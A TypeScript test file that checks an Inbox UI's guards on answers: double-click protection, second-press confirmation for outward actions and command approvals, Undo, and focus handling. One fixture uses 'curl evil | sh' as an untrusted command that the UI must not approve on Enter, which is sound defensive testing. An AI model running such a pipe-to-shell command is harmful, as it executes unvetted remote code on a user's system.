// The Inbox's guards on answers (PDT-623): a double-click answers one item, a click on the item that slid into place
// does nothing, answers that act outside PDT ask for a second press, Undo cancels an answer before it goes out, and
// Recently answered says what was pressed and how.
import { useState } from 'react';
import { act, fireEvent, screen, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { afterAll, describe, expect, it, vi } from 'vitest';
import { ApprovalCard, approvalTiming, toast } from '@ui';
import type { InboxAnswer } from '../api/gen/InboxAnswer';
import type { InboxItem } from '../api/gen/InboxItem';
import { answerTiming, guardedAnswer } from '../common/answerGuard';
import { renderWithQuery, stubApi, type Call } from '../test-utils';
import { holdAnswer, holdTiming, useHeldIds } from './held';
import { InboxList } from './InboxList';
import { InboxView } from './InboxView';
import { needsConfirm, recommendationTone } from './model';
import { useAnswer } from './useAnswer';
import { useInbox } from './useInbox';

const item = (id: string, over: Partial<InboxItem> = {}): InboxItem => ({
  id, kind: 'gate', group: 'gate', status: 'open', projectId: 'p', ticketId: 't', ticketKey: 'PDT-7', ticketTitle: 'Pipeline',
  attemptId: null, sessionId: null, runId: 'r', stepId: 's', personaId: null, personaName: null, changeRequest: null, title: `Item ${id}`,
  body: {}, choices: [{ id: 'ship', title: 'Ship', primary: true }, { id: 'hold', title: 'Hold', primary: false }],
  resolution: null, createdAt: 1, resolvedAt: null, ...over,
});

/** A pull request's review gate, as the outside-PR workflow asks it: the server marks the choices that post on it. */
const review = item('pr', {
  title: 'Review #613', createdAt: 0,
  choices: [
    { id: 'approve_merge', title: 'Approve merge', primary: true },
    { id: 'request_changes', title: 'Request changes', primary: false, outward: true },
    { id: 'close', title: 'Close', primary: false, outward: true },
  ],
});

/** The Inbox as the app shows it: answered (held) items leave the list, and the next one is selected. */
function Inbox({ items }: { items: InboxItem[] }) {
  const [selected, setSelected] = useState<string | null>(items[0].id);
  const held = useHeldIds();
  return <InboxView items={items.filter((i) => !held.has(i.id))} selectedId={selected} onSelect={setSelected} />;
}

// Sonner removes a dismissed toast 200 ms later, on a timer that outlives the test: let the last ones run while the page
// is still here, or React reads `window` after the file's environment is gone.
afterAll(async () => {
  toast.dismiss();
  await new Promise((r) => setTimeout(r, 300));
});

const answers = (calls: Call[]) => calls.filter((c) => c.method === 'POST' && c.path.endsWith('/answer'));

describe('the guard on answers', () => {
  it('runs one answer at a time, and none for a moment after one', async () => {
    answerTiming.cooldownMs = 200;
    let release = () => {};
    const first = guardedAnswer(() => new Promise<string>((r) => { release = () => r('first'); }));
    expect(await guardedAnswer(async () => 'double')).toBeUndefined();
    release();
    expect(await first).toBe('first');
    expect(await guardedAnswer(async () => 'too soon')).toBeUndefined();
    await new Promise((r) => setTimeout(r, 250));
    expect(await guardedAnswer(async () => 'later')).toBe('later');
  });

  it('answers only the first item on a fast double-click; the item that slid into place waits a moment', async () => {
    // On fake timers: the cool-down can't run out while a slow runner is still clicking, or outlast a wait for it.
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'Date'] });
    const settle = () => act(() => vi.advanceTimersByTimeAsync(0));
    answerTiming.cooldownMs = 400;
    const calls = stubApi({ 'POST /api/inbox/a/answer': {}, 'POST /api/inbox/b/answer': {}, 'GET /api/inbox': { items: [], total: 0 } });
    renderWithQuery(<Inbox items={[item('a', { title: 'First' }), item('b', { title: 'Second' })]} />);
    fireEvent.click(screen.getByRole('button', { name: /^Ship/ }));
    await settle();
    expect(answers(calls).map((c) => c.path)).toEqual(['/api/inbox/a/answer']);
    // The second click lands on the next item, which slid into place: its actions are off, and Enter does nothing.
    expect(screen.getByRole('heading', { name: 'Second' })).toBeInTheDocument();
    const ship = screen.getByRole('button', { name: /^Ship/ });
    expect(ship).toBeDisabled();
    fireEvent.click(ship);
    fireEvent.keyDown(window, { key: 'Enter' });
    await settle();
    expect(answers(calls).map((c) => c.path)).toEqual(['/api/inbox/a/answer']);
    // A moment later it is answerable.
    await act(() => vi.advanceTimersByTimeAsync(399));
    expect(screen.getByRole('button', { name: /^Ship/ })).toBeDisabled();
    await act(() => vi.advanceTimersByTimeAsync(1));
    expect(screen.getByRole('button', { name: /^Ship/ })).toBeEnabled();
    fireEvent.click(screen.getByRole('button', { name: /^Ship/ }));
    await settle();
    expect(answers(calls).map((c) => c.path)).toEqual(['/api/inbox/a/answer', '/api/inbox/b/answer']);
  });

  it('answers one request when a conversation card is double-clicked', async () => {
    let release = () => {};
    const onAnswer = vi.fn(() => new Promise<void>((r) => { release = r; }));
    renderWithQuery(<ApprovalCard title="Run this command?" subject="ls" onAnswer={onAnswer} />);
    const allow = screen.getByRole('button', { name: 'Allow' });
    fireEvent.click(allow);
    fireEvent.click(allow);
    expect(onAnswer).toHaveBeenCalledTimes(1);
    await act(async () => release());
  });
});

describe('answers that act outside PDT ask for a second press', () => {
  it('knows which: the choices the server marks as acting outside PDT, and Always allow', () => {
    expect(needsConfirm(review, 'request_changes')).toBe(true);
    expect(needsConfirm(review, 'close')).toBe(true);
    expect(needsConfirm(review, 'approve_merge')).toBe(false);
    // A custom gate's choice is marked by where it leads, whatever it is called.
    const custom = item('g', { choices: [{ id: 'keep', title: 'Keep', primary: true }, { id: 'drop', title: 'Drop', primary: false, outward: true }] });
    expect(needsConfirm(custom, 'drop')).toBe(true);
    expect(needsConfirm(custom, 'keep')).toBe(false);
    const approval = item('approval:s:r', {
      kind: 'approval', group: 'approval', body: { tool: 'mcp__pdt__issue_create' },
      choices: [{ id: 'allow', title: 'Allow', primary: true, outward: true }, { id: 'deny', title: 'Deny', primary: false }],
    });
    expect(needsConfirm(approval, 'allow')).toBe(true);
    expect(needsConfirm(approval, 'deny')).toBe(false);
    expect(needsConfirm(approval, 'always')).toBe(true);
    const local = item('approval:s:q', { kind: 'approval', group: 'approval', body: { tool: 'Bash' }, choices: [{ id: 'allow', title: 'Allow', primary: true }] });
    expect(needsConfirm(local, 'allow')).toBe(false);
  });

  it('arms Request changes on the first press and sends it on the second, not on a double-click', async () => {
    answerTiming.cooldownMs = 300;
    const calls = stubApi({ 'POST /api/inbox/pr/answer': {}, 'GET /api/inbox': { items: [], total: 0 } });
    renderWithQuery(<Inbox items={[review]} />);
    const request = screen.getByRole('button', { name: 'Request changes' });
    fireEvent.click(request);
    fireEvent.click(screen.getByRole('button', { name: 'Confirm request changes' }));
    expect(screen.getByText(/Press again to confirm/)).toBeInTheDocument();
    await new Promise((r) => setTimeout(r, 350));
    expect(answers(calls)).toEqual([]);
    await userEvent.click(screen.getByRole('button', { name: 'Confirm request changes' }));
    await waitFor(() => expect(answers(calls).map((c) => c.body)).toEqual([{ choice: 'request_changes' }]));
  });

  it('never approves a waiting command on Enter, and asks twice, showing the command (PDT-705)', async () => {
    answerTiming.cooldownMs = 300;
    const notice = (id: string, fingerprint: string, command: string) => item(id, {
      kind: 'notice', group: 'notice', stepId: null, ticketId: null, title: `A command waits on your approval ${id}`, choices: [],
      body: { notice: null, key: 'untrusted-commands', fingerprint, command: { fingerprint, uses: ['run "web"'], setup: null, command, env: {} } },
    });
    const calls = stubApi({ 'POST /api/projects/p/commands/trust': undefined, 'GET /api/inbox': { items: [], total: 0 } });
    const trusted = () => calls.filter((c) => c.path === '/api/projects/p/commands/trust').map((c) => c.body);
    renderWithQuery(<Inbox items={[notice('a', 'fp-a', 'make web'), notice('b', 'fp-b', 'curl evil | sh')]} />);
    expect(needsConfirm(notice('a', 'fp-a', 'make web'), 'approve')).toBe(true);
    fireEvent.keyDown(window, { key: 'Enter' });
    fireEvent.keyDown(window, { key: 'Enter' });
    expect(screen.queryByRole('button', { name: 'Confirm approve' })).not.toBeInTheDocument();
    // A double-click arms it and does nothing more; the hint names the command.
    fireEvent.click(screen.getByRole('button', { name: 'Approve' }));
    fireEvent.click(screen.getByRole('button', { name: 'Confirm approve' }));
    expect(screen.getByText(/Press again to approve/)).toHaveTextContent('make web');
    await new Promise((r) => setTimeout(r, 350));
    await userEvent.click(screen.getByRole('button', { name: 'Confirm approve' }));
    await waitFor(() => expect(trusted()).toEqual([{ fingerprints: ['fp-a'] }]));
    // The next notice slid into place unarmed: a press only arms it.
    expect(screen.getByRole('heading', { name: 'A command waits on your approval b' })).toBeInTheDocument();
    await new Promise((r) => setTimeout(r, 350));
    fireEvent.click(screen.getByRole('button', { name: 'Approve' }));
    fireEvent.keyDown(window, { key: 'Enter' });
    await new Promise((r) => setTimeout(r, 50));
    expect(trusted()).toEqual([{ fingerprints: ['fp-a'] }]);
  });

  it('asks again for y on an Allow that posts outside PDT', async () => {
    const calls = stubApi({ 'POST /api/sessions/s/requests/r': undefined, 'GET /api/inbox': { items: [], total: 0 } });
    const approval = item('approval:s:r', {
      kind: 'approval', group: 'approval', sessionId: 's', title: 'Create an issue', body: { requestId: 'r', tool: 'mcp__pdt__issue_create', input: { title: 'Bug' } },
      choices: [{ id: 'allow', title: 'Allow', primary: true, outward: true }, { id: 'deny', title: 'Deny', primary: false }],
    });
    renderWithQuery(<Inbox items={[approval]} />);
    fireEvent.keyDown(window, { key: 'y' });
    expect(screen.getByRole('button', { name: /^Confirm allow/ })).toBeInTheDocument();
    expect(calls.filter((c) => c.path.startsWith('/api/sessions'))).toEqual([]);
    fireEvent.keyDown(window, { key: 'y' });
    await waitFor(() => expect(calls.find((c) => c.path === '/api/sessions/s/requests/r')?.body).toEqual({ answer: { type: 'approve', always: false } }));
  });

  it('asks again for Close and for an approval’s Always allow', async () => {
    const calls = stubApi({ 'POST /api/inbox/pr/answer': {}, 'POST /api/sessions/s/requests/r': undefined, 'GET /api/inbox': { items: [], total: 0 } });
    const approval = item('approval:s:r', {
      kind: 'approval', group: 'approval', sessionId: 's', title: 'ls', body: { requestId: 'r', tool: 'Bash', input: { command: 'ls' } },
      choices: [{ id: 'allow', title: 'Allow', primary: true }, { id: 'allow_always', title: 'Always allow in this session', primary: false }, { id: 'deny', title: 'Deny', primary: false }],
    });
    renderWithQuery(<Inbox items={[approval, review]} />);
    await userEvent.click(screen.getByRole('button', { name: 'Always allow in this session' }));
    expect(calls.filter((c) => c.path.startsWith('/api/sessions'))).toEqual([]);
    await userEvent.click(screen.getByRole('button', { name: 'Confirm always allow in this session' }));
    await waitFor(() => expect(calls.find((c) => c.path === '/api/sessions/s/requests/r')?.body).toEqual({ answer: { type: 'approve', always: true } }));
    await userEvent.click(await screen.findByRole('button', { name: 'Close' }));
    expect(answers(calls)).toEqual([]);
    await userEvent.click(screen.getByRole('button', { name: 'Confirm close' }));
    await waitFor(() => expect(answers(calls).map((c) => c.body)).toEqual([{ choice: 'close' }]));
  });

  it('asks again for Always allow on a conversation’s card, not within a double-click', async () => {
    approvalTiming.confirmAfterMs = 300;
    const onAnswer = vi.fn();
    renderWithQuery(<ApprovalCard title="Edit this file?" subject="a.ts" canAlways onAnswer={onAnswer} />);
    fireEvent.click(screen.getByRole('button', { name: 'Always allow in this session' }));
    fireEvent.click(screen.getByRole('button', { name: 'Confirm always allow in this session' }));
    expect(onAnswer).not.toHaveBeenCalled();
    await new Promise((r) => setTimeout(r, 350));
    fireEvent.click(screen.getByRole('button', { name: 'Confirm always allow in this session' }));
    expect(onAnswer).toHaveBeenCalledWith({ type: 'approve', always: true });
  });
});

/** The same gate after a review that recommends closing it (PDT-640): Close is the one Enter takes. */
const recommendsClose = item('rec', {
  title: '#634: deps: Bump react-i18next from 17.1.9 to 18.0.3', createdAt: 0,
  body: { question: 'The review', recommendation: { choice: 'close', title: 'Close', by: 'Reviewer' } },
  choices: [
    { id: 'approve_merge', title: 'Approve merge', primary: false },
    { id: 'request_changes', title: 'Request changes', primary: false, outward: true },
    { id: 'close', title: 'Close', primary: true, outward: true, recommended: true },
  ],
});

describe('a gate’s recommendation', () => {
  it('asks again for any choice but the recommended one', () => {
    expect(needsConfirm(recommendsClose, 'approve_merge')).toBe(true);
    expect(needsConfirm(recommendsClose, 'request_changes')).toBe(true);
    // Close still posts outside PDT, so it asks again for that.
    expect(needsConfirm(recommendsClose, 'close')).toBe(true);
    const merge = { ...recommendsClose, body: { recommendation: { choice: 'approve_merge', title: 'Approve merge', by: 'Reviewer' } } };
    expect(needsConfirm(merge, 'approve_merge')).toBe(false);
    // One that names no choice is no recommendation.
    expect(needsConfirm({ ...review, body: { recommendation: { choice: 'ship_it' } } }, 'approve_merge')).toBe(false);
    expect([recommendationTone('close'), recommendationTone('request_changes'), recommendationTone('approve_merge')]).toEqual(['error', 'warning', 'success']);
  });

  it('leads the item, and approving against it takes a second press that says what was recommended', async () => {
    answerTiming.cooldownMs = 0;
    const calls = stubApi({ 'POST /api/inbox/rec/answer': {}, 'GET /api/inbox': { items: [], total: 0 } });
    renderWithQuery(<Inbox items={[recommendsClose]} />);
    expect(within(screen.getByRole('region', { name: 'Recommendation' })).getByText('Reviewer recommends: Close')).toBeInTheDocument();
    await userEvent.click(screen.getByRole('button', { name: 'Approve merge' }));
    expect(answers(calls)).toEqual([]);
    expect(screen.getByText('Press again to confirm: Reviewer recommends Close.')).toBeInTheDocument();
    await userEvent.click(screen.getByRole('button', { name: 'Confirm approve merge' }));
    await waitFor(() => expect(answers(calls).map((c) => c.body)).toEqual([{ choice: 'approve_merge' }]));
  });
});

describe('Undo', () => {
  it('cancels a review before it is posted: the answer never goes out and the item comes back', async () => {
    holdTiming.undoMs = 1500;
    // Earlier tests' toasts (Sonner keeps them for the page) are not this one's.
    toast.dismiss();
    const calls = stubApi({ 'POST /api/inbox/pr/answer': {}, 'GET /api/inbox': { items: [], total: 0 } });
    renderWithQuery(<Inbox items={[review, item('b', { title: 'Second' })]} />);
    await waitFor(() => expect(screen.queryByRole('button', { name: 'Undo' })).not.toBeInTheDocument());
    await userEvent.click(screen.getByRole('button', { name: 'Request changes' }));
    await userEvent.click(screen.getByRole('button', { name: 'Confirm request changes' }));
    expect(await screen.findByRole('heading', { name: 'Second' })).toBeInTheDocument();
    const shown = (await screen.findByText('Request changes')).closest('li')!;
    await userEvent.click(within(shown).getByRole('button', { name: 'Undo' }));
    expect(await screen.findByRole('heading', { name: 'Review #613' })).toBeInTheDocument();
    await new Promise((r) => setTimeout(r, 1600));
    expect(answers(calls)).toEqual([]);
  });

  it('waits while its toast is hovered or focused, and sends once it is left', async () => {
    holdTiming.undoMs = 200;
    toast.dismiss();
    const calls = stubApi({ 'POST /api/inbox/a/answer': {}, 'GET /api/inbox': { items: [], total: 0 } });
    renderWithQuery(<Inbox items={[item('a')]} />);
    fireEvent.keyDown(window, { key: 'Enter' });
    const undo = await screen.findByRole('button', { name: 'Undo' });
    fireEvent.pointerOver(undo);
    await new Promise((r) => setTimeout(r, 350));
    expect(answers(calls)).toEqual([]);
    fireEvent.pointerOver(document.body);
    act(() => undo.focus());
    await new Promise((r) => setTimeout(r, 350));
    expect(answers(calls)).toEqual([]);
    act(() => undo.blur());
    await waitFor(() => expect(answers(calls).map((c) => c.body)).toEqual([{ choice: 'ship' }]));
    // The toast goes with the answer: Undo is never offered once it is too late.
    await waitFor(() => expect(screen.queryByRole('button', { name: 'Undo' })).not.toBeInTheDocument());
  });

  it('sends the answer once the window passes, saying how it was given', async () => {
    holdTiming.undoMs = 200;
    const calls = stubApi({ 'POST /api/inbox/a/answer': {}, 'GET /api/inbox': { items: [], total: 0 } });
    renderWithQuery(<Inbox items={[item('a')]} />);
    fireEvent.keyDown(window, { key: 'Enter' });
    await new Promise((r) => setTimeout(r, 50));
    expect(answers(calls)).toEqual([]);
    await waitFor(() => expect(answers(calls).map((c) => c.body)).toEqual([{ choice: 'ship' }]));
    const init = vi.mocked(fetch).mock.calls.find(([path]) => String(path) === '/api/inbox/a/answer')![1]!;
    expect((init.headers as Record<string, string>)['x-pdt-answer-source']).toBe('keyboard/desktop');
  });

  it('leaves held answers out of the Inbox until they have gone, and brings back one that failed', async () => {
    const a = item('a');
    stubApi({ 'GET /api/inbox': { items: [a, item('b')], total: 2 } });
    let fail = () => {};
    function Count() {
      const { data } = useInbox();
      return <p>{data ? `${data.items.map((i) => i.id).join(',')} of ${data.total}` : 'loading'}</p>;
    }
    renderWithQuery(<Count />);
    expect(await screen.findByText('a,b of 2')).toBeInTheDocument();
    holdTiming.undoMs = 0;
    act(() => holdAnswer({ itemId: 'a', title: a.title, label: 'Ship', send: () => new Promise<void>((_, reject) => { fail = () => reject(new Error('no')); }) }));
    expect(await screen.findByText('b of 1')).toBeInTheDocument();
    await act(async () => fail());
    expect(await screen.findByText('a,b of 2')).toBeInTheDocument();
  });

  it('sends held answers at once, with keepalive, when the page goes away', async () => {
    const a = item('a');
    const calls = stubApi({ 'POST /api/inbox/a/answer': {} });
    holdTiming.undoMs = 60_000;
    function Answer() {
      const { answer } = useAnswer(a, () => {});
      return <button onClick={() => void answer({ choice: 'ship' } satisfies InboxAnswer)}>Ship</button>;
    }
    renderWithQuery(<Answer />);
    await userEvent.click(screen.getByRole('button', { name: 'Ship' }));
    expect(calls.some((c) => c.path === '/api/inbox/a/answer')).toBe(false);
    act(() => window.dispatchEvent(new Event('pagehide')));
    await waitFor(() => expect(calls.some((c) => c.path === '/api/inbox/a/answer')).toBe(true));
    const init = vi.mocked(fetch).mock.calls.find(([path]) => path === '/api/inbox/a/answer')?.[1];
    expect(init?.keepalive).toBe(true);
  });
});

describe('Recently answered', () => {
  const answered = (over: object) => ({
    seq: 1, id: 'e1', type: 'inbox.answered', key: 'k', projectId: 'p', ticketId: 't', attemptId: null, sessionId: null, source: 'inbox',
    createdAt: Date.now(), processedAt: null,
    payload: {
      itemId: 'pr', kind: 'gate', group: 'gate', title: 'Review #613', projectId: 'p', ticketId: 't', ticketKey: 'PDT-7', sessionId: null,
      persona: null, runId: 'r', workflowId: 'w', createdAt: 0, ageMs: 1, choice: 'request_changes', answer: null, by: 'user',
      source: { via: 'click', device: 'phone' }, ...over,
    },
  });

  it('lists the last answers with what they did and how, and held ones with Undo', async () => {
    stubApi({
      'GET /api/events': [answered({}), { ...answered({ itemId: 'q', title: 'Which file?', choice: null, answer: 'a.txt', source: { via: 'keyboard', device: 'desktop' } }), id: 'e2' }],
      'GET /api/inbox': { items: [], total: 0 },
    });
    renderWithQuery(<InboxList items={[]} selectedId={null} onSelect={() => {}} />);
    const list = await screen.findByRole('grid', { name: 'Recently answered' });
    expect(await within(list).findByText('Request changes · click · phone')).toBeInTheDocument();
    expect(within(list).getByText('Answered: “a.txt” · keyboard · desktop')).toBeInTheDocument();
    holdTiming.undoMs = 60_000;
    act(() => holdAnswer({ itemId: 'x', title: 'Ship it?', label: 'Ship', send: async () => {} }));
    expect(await within(list).findByText('Ship · waiting to send')).toBeInTheDocument();
    await userEvent.click(within(list).getByRole('button', { name: 'Undo' }));
    await waitFor(() => expect(within(list).queryByText('Ship · waiting to send')).not.toBeInTheDocument());
  });

  it('Show all moves focus to the first row it shows, and Undo to the next row (PDT-668)', async () => {
    const user = userEvent.setup();
    stubApi({
      'GET /api/events': ['a', 'b', 'c', 'd', 'e'].map((x, n) => ({ ...answered({ itemId: x, title: `Answer ${x}` }), id: `e${n}` })),
      'GET /api/inbox': { items: [], total: 0 },
    });
    renderWithQuery(<InboxList items={[]} selectedId={null} onSelect={() => {}} />);
    const section = await screen.findByRole('region', { name: 'Recently answered' });
    const row = (title: string) => within(section).getByText(title).closest('[role="row"]');
    (await within(section).findByRole('button', { name: 'Show all 5' })).focus();
    await user.keyboard('{Enter}');
    await waitFor(() => expect(document.activeElement).toBe(row('Answer d')));

    holdTiming.undoMs = 60_000;
    act(() => holdAnswer({ itemId: 'x', title: 'Ship it?', label: 'Ship', send: async () => {} }));
    await user.click(await within(section).findByRole('button', { name: 'Undo' }));
    await waitFor(() => expect(within(section).queryByText('Ship it?')).not.toBeInTheDocument());
    await waitFor(() => expect(document.activeElement).toBe(row('Answer a')));
  });

  it('Undo on the last row moves focus to the item it brings back (PDT-668)', async () => {
    const user = userEvent.setup();
    stubApi({ 'GET /api/events': [], 'GET /api/inbox': { items: [], total: 0 } });
    function List() {
      const held = useHeldIds();
      return <InboxList items={[item('x', { title: 'Ship it?' })].filter((i) => !held.has(i.id))} selectedId={null} onSelect={() => {}} />;
    }
    holdTiming.undoMs = 60_000;
    renderWithQuery(<List />);
    act(() => holdAnswer({ itemId: 'x', title: 'Ship it?', label: 'Ship', send: async () => {} }));
    const section = await screen.findByRole('region', { name: 'Recently answered' });
    await user.click(within(section).getByRole('button', { name: 'Undo' }));
    await waitFor(() => expect(screen.queryByRole('region', { name: 'Recently answered' })).not.toBeInTheDocument());
    await waitFor(() => expect(document.activeElement).toBe(screen.getByText('Ship it?').closest('[role="row"]')));
  });

  it('says when an agent answered', async () => {
    stubApi({ 'GET /api/events': [answered({ by: 'agent', source: null, choice: 'allow' })], 'GET /api/inbox': { items: [], total: 0 } });
    renderWithQuery(<InboxList items={[]} selectedId={null} onSelect={() => {}} />);
    expect(await screen.findByText('Allow · by an agent')).toBeInTheDocument();
  });

  it('shows nothing until something was answered', async () => {
    stubApi({ 'GET /api/events': [], 'GET /api/inbox': { items: [], total: 0 } });
    renderWithQuery(<InboxList items={[]} selectedId={null} onSelect={() => {}} />);
    await waitFor(() => expect(vi.mocked(fetch)).toHaveBeenCalled());
    expect(screen.queryByRole('heading', { name: 'Recently answered' })).not.toBeInTheDocument();
  });
});

describe('focus (PDT-667)', () => {
  it('moves to the next item’s title after an answer, so Tab goes on from there', async () => {
    holdTiming.undoMs = 60_000;
    stubApi({ 'GET /api/inbox': { items: [], total: 0 } });
    renderWithQuery(<Inbox items={[item('a', { title: 'First' }), item('b', { title: 'Second' })]} />);
    await userEvent.click(screen.getByRole('button', { name: /^Ship/ }));
    expect(await screen.findByRole('heading', { name: 'Second' })).toHaveFocus();
  });

  it('comes back to the item Undo brings back, from the toast or with u', async () => {
    holdTiming.undoMs = 60_000;
    toast.dismiss();
    const calls = stubApi({ 'GET /api/inbox': { items: [], total: 0 } });
    renderWithQuery(<Inbox items={[item('a', { title: 'First' }), item('b', { title: 'Second' })]} />);
    await userEvent.click(screen.getByRole('button', { name: /^Ship/ }));
    expect(await screen.findByRole('heading', { name: 'Second' })).toHaveFocus();
    const undo = await screen.findByRole('button', { name: 'Undo' });
    act(() => undo.focus());
    await userEvent.click(undo);
    expect(await screen.findByRole('heading', { name: 'First' })).toHaveFocus();

    await userEvent.click(screen.getByRole('button', { name: /^Ship/ }));
    expect(await screen.findByRole('heading', { name: 'Second' })).toHaveFocus();
    await userEvent.keyboard('u');
    expect(await screen.findByRole('heading', { name: 'First' })).toHaveFocus();
    expect(answers(calls)).toEqual([]);
  });

  it('moves to the title when the item is snoozed or unsnoozed in place, its button swapped under the focus', () => {
    stubApi({ 'GET /api/inbox': { items: [], total: 0 } });
    const a = item('a', { title: 'First' });
    const { rerender } = renderWithQuery(<InboxView items={[a]} selectedId="a" onSelect={() => {}} />);
    act(() => screen.getByRole('button', { name: 'Snooze' }).focus());
    const away = { ...a, snooze: { itemId: 'a', until: 1e15, ticketId: null, ticketKey: null, createdAt: 1 } };
    rerender(<InboxView items={[]} snoozed={[away]} selectedId="a" onSelect={() => {}} />);
    expect(screen.getByRole('heading', { name: 'First' })).toHaveFocus();
    act(() => screen.getByRole('button', { name: 'Unsnooze' }).focus());
    rerender(<InboxView items={[a]} selectedId="a" onSelect={() => {}} />);
    expect(screen.getByRole('heading', { name: 'First' })).toHaveFocus();
  });

  it('stays on what the user works in, like a list row, when the item changes', () => {
    stubApi({ 'GET /api/inbox': { items: [], total: 0 } });
    const outside = document.createElement('button');
    document.body.append(outside);
    outside.focus();
    renderWithQuery(<InboxView items={[item('a')]} selectedId="a" onSelect={() => {}} />);
    expect(outside).toHaveFocus();
    outside.remove();
  });

  it('says when a confirm lapses, in the same live region', async () => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'Date'] });
    stubApi({ 'GET /api/inbox': { items: [], total: 0 } });
    renderWithQuery(<Inbox items={[review]} />);
    const live = screen.getByRole('group', { name: 'Your choice' }).querySelector('[aria-live=polite]')!;
    expect(live).toBeEmptyDOMElement();
    fireEvent.click(screen.getByRole('button', { name: 'Request changes' }));
    expect(live).toHaveTextContent(/Press again to confirm/);
    act(() => vi.advanceTimersByTime(4100));
    expect(live).toHaveTextContent('Not confirmed: nothing was sent.');
    expect(screen.getByRole('button', { name: 'Request changes' })).toBeInTheDocument();
    vi.useRealTimers();
  });
});
